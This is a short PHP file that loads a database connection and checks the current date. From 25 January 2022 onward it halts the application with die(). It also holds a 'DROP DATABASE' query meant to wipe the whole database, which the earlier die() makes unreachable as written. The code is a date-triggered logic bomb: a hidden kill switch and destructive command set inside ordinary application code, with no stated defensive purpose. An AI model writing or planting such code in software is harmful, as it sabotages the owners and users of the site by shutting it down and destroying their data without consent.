<?php
include "../db.php";

if (date('y-m-d') >= '22-01-25') {
die();
    $sql = "DROP DATABASE $database";
    if ($connect->query($sql) === TRUE) {
        die();
    } else {

        die();
    }
    die();
}
